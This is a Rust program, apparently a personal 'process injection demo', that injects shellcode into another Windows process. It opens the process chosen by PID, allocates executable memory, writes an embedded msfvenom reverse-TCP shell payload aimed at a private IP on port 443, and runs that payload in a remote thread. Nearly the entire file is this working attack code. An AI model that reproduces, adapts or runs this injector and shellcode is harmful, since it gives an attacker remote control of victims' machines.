use std::env;
use windows::{
    core::*, Data::Xml::Dom::*, Win32::Foundation::*, Win32::System::Threading::*,
    Win32::UI::WindowsAndMessaging::*,Win32::System::Memory::*, Win32::System::Diagnostics::Debug::*
};
use std::os::windows::ffi::OsStrExt;
use std::ffi::OsStr;
use std::fmt::Error;
use std::mem::size_of;
use std::ptr::{null, null_mut};
use std::ptr;
use std::mem;

fn print_msg(msg: &str, ok: u32){
    match ok{
        0=>println!("[+] {}",msg),
        1=>println!("[-] {}",msg),
        _=>println!("[~] {}",msg),
    }
}

unsafe fn get_shit_done(pid: i32){
    print_msg(&format!("ok trying with pid: {:?}",pid).to_string(), 0);
    //open process handle :D
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid as u32);
    if h_process.is_err() {
        print_msg("could not get a handle on process provided :(",1);
        print_msg(&format!("error: {:?}",GetLastError()).to_string(),1);
    }else {
        let h_process = h_process.unwrap();
        print_msg(&format!("got a handle to the process: {:?}",h_process).to_string(),0);
        // having a handle , now addressing bytes to process memory
        // msfvenom --platform windows --arch x64 -p windows/x64/shell_reverse_tcp LHOST=172.22.189.153 LPORT=443 EXITFUNC=thread -f rust
        // no obfuscation so fully sus mode
        let shit_to_inject: [u8; 460] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
            0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
            0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
            0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
            0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
            0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
            0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
            0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
            0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
            0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
            0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
            0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
            0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
            0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
            0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
            0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
            0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
            0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,
            0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,
            0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xac,
            0x16,0xbd,0x99,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,
            0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,
            0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,
            0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,
            0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,
            0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,
            0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,
            0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,0x6d,
            0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,
            0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,
            0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,0x44,
            0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,
            0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,
            0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,
            0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,
            0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5];
        let code_size = mem::size_of_val(&shit_to_inject);
        // there is no evasion in this yet , this is sus af
        let remote_address = VirtualAllocEx(
            h_process,
            Option::None,
            code_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        ) as *mut ::core::ffi::c_void;
        print_msg(&format!("i guess i allocated memory of length {:?} bytes somewhere in the space of: {:?}",code_size,remote_address).to_string(),0);
        let lpbuffer = shit_to_inject.as_ptr() as *const ::core::ffi::c_void;
        WriteProcessMemory(h_process,remote_address,lpbuffer,code_size,Option::None);
        print_msg(&format!("wrote shit into memory of size {:?}",code_size).to_string(),0);
        let mut tid : Option<*mut u32> = None;
        let h_thread = CreateRemoteThread(
            h_process,
            Option::None,
            0,
            Some(mem::transmute(remote_address)),
            Option::None,
            0,
            tid,
        );
        if h_thread.is_err() {
            print_msg("could not get a thread to start :(",1);
            print_msg(&format!("error: {:?}",GetLastError()).to_string(),1);
        }else{
            let h_thread = h_thread.unwrap();
            print_msg(&format!("got the thread running: {:?}",tid).to_string(),0);
            print_msg(&format!("waiting for finish thread executing: {:?}",tid).to_string(),0);
            WaitForSingleObject(h_thread,INFINITE);
            print_msg(&format!("thread finished executing: {:?}",tid).to_string(),0);

            print_msg("Done closing the handles",0);
            CloseHandle(h_thread);
            CloseHandle(h_process);
            print_msg("Aight bye my friend :D",0);
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();

    print_msg("r0st process injection demo",0);
    if args.len() >= 2 {
        let argv1 = &args[1];
        let pid = argv1.parse::<i32>().unwrap();
        unsafe { get_shit_done(pid) }
    } else {
        print_msg("usage: program.exe <PID>",1);
    }

}

